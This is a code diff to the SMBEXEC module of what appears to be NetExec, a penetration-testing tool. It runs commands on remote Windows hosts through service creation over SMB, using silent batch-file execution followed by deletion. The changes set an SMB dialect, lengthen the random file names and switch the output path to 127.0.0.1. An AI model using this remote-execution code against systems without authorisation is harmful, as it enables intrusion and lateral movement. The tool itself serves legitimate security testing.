@@ -2,6 +2,8 @@ import os
 from os.path import join as path_join
 from time import sleep
 from impacket.dcerpc.v5 import transport, scmr
+from impacket.smb3structs import SMB2_DIALECT_311
+
 from nxc.helpers.misc import gen_random_string
 from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
@@ -47,6 +49,10 @@ class SMBEXEC:
         stringbinding = f"ncacn_np:{self.__host}[\\pipe\\svcctl]"
         self.logger.debug(f"StringBinding {stringbinding}")
         self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
+
+        self.__rpctransport.preferred_dialect(SMB2_DIALECT_311)
+
+
         self.__rpctransport.set_dport(self.__port)
 
         if hasattr(self.__rpctransport, "setRemoteHost"):
@@ -70,7 +76,7 @@ class SMBEXEC:
         self.__scmr.connect()
         s = self.__rpctransport.get_smb_connection()
         # We don't wanna deal with timeouts from now on.
-        s.setTimeout(100000)
+        s.setTimeout(101000)
 
         self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
         resp = scmr.hROpenSCManagerW(self.__scmr)
@@ -91,10 +97,10 @@ class SMBEXEC:
         self.__outputBuffer += data
 
     def execute_remote(self, data):
-        self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
+        self.__output = gen_random_string(12)
+        self.__batchFile = gen_random_string(12) + ".bat"
 
-        command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
+        command = self.__shell + "echo " + data + f" ^> \\\\127.0.0.1\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
 
         with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
